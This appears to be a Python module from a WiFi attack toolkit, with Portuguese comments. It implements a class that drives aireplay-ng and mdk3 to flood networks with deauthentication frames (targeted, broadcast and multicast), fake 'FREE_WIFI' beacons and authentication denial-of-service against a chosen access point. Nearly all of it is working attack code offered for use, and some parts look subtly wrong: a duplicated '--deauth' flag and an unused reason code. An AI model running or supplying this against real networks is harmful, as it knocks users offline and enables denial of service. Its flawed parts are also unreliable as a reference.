"""
Módulo de ataque de desautenticação.

Este módulo implementa ataques de desautenticação contra redes WiFi, permitindo:
- Desautenticar clientes específicos
- Desautenticar todos os clientes de uma rede
- Enviar pacotes de desautenticação em massa
- Realizar ataques Beacon Flood
- Realizar ataques de desautenticação direcionados
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable, Union
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from ...core.models.network import WiFiNetwork, WiFiClient
from ...utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists,
    get_interface_mac
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class DeauthAttackType(Enum):
    """Tipos de ataque de desautenticação."""
    DEAUTH = auto()          # Desautenticação padrão
    AUTH = auto()            # Pacotes de autenticação
    BEACON = auto()          # Beacon flood
    DISASSOC = auto()        # Desassociação
    PROBE_RESP = auto()      # Resposta a sondas
    AUTH_DOS = auto()        # Negação de serviço por autenticação
    DEAUTH_BROADCAST = auto() # Desautenticação em broadcast
    DEAUTH_MULTICAST = auto() # Desautenticação em multicast
    DEAUTH_DIRECTED = auto()  # Desautenticação direcionada

class DeauthEventType(Enum):
    """Tipos de eventos do ataque de desautenticação."""
    START = auto()
    PACKET_SENT = auto()
    CLIENT_DISCONNECTED = auto()
    ERROR = auto()
    COMPLETE = auto()
    STATUS = auto()

@dataclass
class DeauthEvent:
    """Evento de progresso do ataque de desautenticação."""
    type: DeauthEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class DeauthAttack:
    """Classe para realizar ataques de desautenticação."""
    
    def __init__(self, interface: str = None, deauth_type: DeauthAttackType = DeauthAttackType.DEAUTH):
        """
        Inicializa o ataque de desautenticação.
        
        Args:
            interface: Interface de rede para usar no ataque
            deauth_type: Tipo de ataque de desautenticação
        """
        self.interface = interface
        self.deauth_type = deauth_type
        self.is_running = False
        self.stop_requested = False
        self.packets_sent = 0
        self.process = None
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este ataque requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['aireplay-ng', 'mdk4', 'mdk3', 'iwconfig', 'ifconfig']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install aircrack-ng mdk4 mdk3 wireless-tools"
            )
    
    def start(self, bssid: str, client_mac: str = None, 
             count: int = 0, delay: int = 100,
             reason: int = 7, channel: int = None,
             callback: Callable[[DeauthEvent], None] = None) -> bool:
        """
        Inicia o ataque de desautenticação.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            client_mac: Endereço MAC do cliente (None para broadcast)
            count: Número de pacotes a enviar (0 para contínuo)
            delay: Atraso entre pacotes em milissegundos
            reason: Código de motivo da desautenticação
            channel: Canal da rede (opcional, tenta detectar automaticamente)
            callback: Função de callback para eventos
            
        Returns:
            True se o ataque foi iniciado com sucesso, False caso contrário
        """
        self.is_running = True
        self.stop_requested = False
        self.packets_sent = 0
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: DeauthEventType, message: str = "", **kwargs):
            if callback:
                event = DeauthEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Define o canal, se especificado
            if channel:
                self._set_channel(channel)
            
            # Prepara o comando com base no tipo de ataque
            if self.deauth_type == DeauthAttackType.BEACON:
                cmd = self._prepare_beacon_attack(bssid, essid="FREE_WIFI")
            elif self.deauth_type == DeauthAttackType.AUTH_DOS:
                cmd = self._prepare_auth_dos(bssid)
            elif self.deauth_type == DeauthAttackType.DEAUTH_BROADCAST:
                cmd = self._prepare_broadcast_deauth(bssid, count, delay, reason)
            elif self.deauth_type == DeauthAttackType.DEAUTH_MULTICAST:
                cmd = self._prepare_multicast_deauth(bssid, count, delay, reason)
            elif self.deauth_type == DeauthAttackType.DEAUTH_DIRECTED:
                if not client_mac:
                    raise ValueError("Endereço MAC do cliente é necessário para desautenticação direcionada")
                cmd = self._prepare_directed_deauth(bssid, client_mac, count, delay, reason)
            else:  # Desautenticação padrão
                cmd = self._prepare_standard_deauth(bssid, client_mac, count, delay, reason)
            
            event_handler(DeauthEventType.START, f"Iniciando ataque {self.deauth_type.name}...")
            
            # Executa o comando em segundo plano
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitora a saída
            start_time = time.time()
            
            while True:
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    self._stop_process()
                    event_handler(DeauthEventType.COMPLETE, "Ataque interrompido pelo usuário")
                    return True
                
                # Verifica se o processo ainda está em execução
                if self.process.poll() is not None:
                    break
                
                # Lê a saída
                line = self.process.stdout.readline()
                if line:
                    # Conta os pacotes enviados
                    if "DeAuth" in line or "Sent" in line:
                        self.packets_sent += 1
                        event_handler(
                            DeauthEventType.PACKET_SENT,
                            f"Pacote {self.packets_sent} enviado",
                            packets_sent=self.packets_sent
                        )
                    
                    # Verifica se um cliente foi desconectado
                    if "deauth" in line.lower() or "disassoc" in line.lower():
                        event_handler(
                            DeauthEventType.CLIENT_DISCONNECTED,
                            f"Cliente {client_mac or 'broadcast'} desconectado",
                            client_mac=client_mac,
                            bssid=bssid
                        )
                
                # Aguarda um pouco antes da próxima verificação
                time.sleep(0.1)
            
            event_handler(DeauthEventType.COMPLETE, "Ataque concluído")
            return True
            
        except Exception as e:
            event_handler(
                DeauthEventType.ERROR,
                f"Erro durante o ataque de desautenticação: {str(e)}"
            )
            return False
        
        finally:
            self.is_running = False
            self._stop_process()
    
    def _prepare_standard_deauth(self, bssid: str, client_mac: str = None,
                              count: int = 0, delay: int = 100,
                              reason: int = 7) -> List[str]:
        """Prepara o comando para desautenticação padrão."""
        cmd = [
            'aireplay-ng',
            '--deauth', str(count) if count > 0 else '0',
            '-a', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
        ]
        
        if client_mac and client_mac.lower() != 'ff:ff:ff:ff:ff:ff':
            cmd.extend(['-c', client_mac])
        
        if delay > 0:
            cmd.extend(['--deauth', str(delay)])
        
        cmd.append(self.interface)
        return cmd
    
    def _prepare_beacon_attack(self, bssid: str, essid: str = "FREE_WIFI") -> List[str]:
        """Prepara o comando para ataque de Beacon Flood."""
        # Usa o mdk3 para enviar beacons falsos
        return [
            'mdk3', self.interface, 'b',
            '-n', essid,
            '-c', '1,6,11',  # Canais 1, 6 e 11 (2.4GHz)
            '-s', '1000'     # Velocidade de envio
        ]
    
    def _prepare_auth_dos(self, bssid: str) -> List[str]:
        """Prepara o comando para ataque de negação de serviço por autenticação."""
        # Usa o mdk3 para enviar solicitações de autenticação em massa
        return [
            'mdk3', self.interface, 'a',
            '-a', bssid,
            '-m',             # Usa endereços MAC aleatórios
            '-s', '1000'      # Velocidade de envio
        ]
    
    def _prepare_broadcast_deauth(self, bssid: str, count: int, delay: int, reason: int) -> List[str]:
        """Prepara o comando para desautenticação em broadcast."""
        return [
            'mdk3', self.interface, 'd',
            '-b', bssid,
            '-c', str(self._get_channel() or '1'),
            '-s', '1000',
            '-n', str(count) if count > 0 else '0'
        ]
    
    def _prepare_multicast_deauth(self, bssid: str, count: int, delay: int, reason: int) -> List[str]:
        """Prepara o comando para desautenticação em multicast."""
        # Usa o aireplay-ng para enviar pacotes de desautenticação em multicast
        return [
            'aireplay-ng',
            '--deauth', str(count) if count > 0 else '0',
            '-a', bssid,
            '-h', '01:00:5E:00:00:01',  # Endereço multicast
            '--ignore-negative-one',
            self.interface
        ]
    
    def _prepare_directed_deauth(self, bssid: str, client_mac: str, 
                               count: int, delay: int, reason: int) -> List[str]:
        """Prepara o comando para desautenticação direcionada."""
        return [
            'aireplay-ng',
            '--deauth', str(count) if count > 0 else '0',
            '-a', bssid,
            '-c', client_mac,
            '--ignore-negative-one',
            self.interface
        ]
    
    def _set_channel(self, channel: int) -> bool:
        """Define o canal da interface de rede."""
        try:
            subprocess.run(
                ['iwconfig', self.interface, 'channel', str(channel)],
                check=True,
                capture_output=True
            )
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Erro ao definir o canal: {e.stderr}")
            return False
    
    def _get_channel(self) -> Optional[int]:
        """Obtém o canal atual da interface de rede."""
        try:
            result = subprocess.run(
                ['iwconfig', self.interface],
                capture_output=True,
                text=True
            )
            
            # Procura por algo como "Channel:11" ou "Frequency:2.412 GHz (Channel 1)"
            match = re.search(r'Channel:(\d+)', result.stdout)
            if match:
                return int(match.group(1))
            
            match = re.search(r'Channel\s+(\d+)', result.stdout)
            if match:
                return int(match.group(1))
            
            return None
            
        except Exception as e:
            logger.error(f"Erro ao obter o canal: {e}")
            return None
    
    def _stop_process(self):
        """Para o processo em execução."""
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                try:
                    self.process.kill()
                except:
                    pass
    
    def stop(self):
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
        self._stop_process()
        self.is_running = False
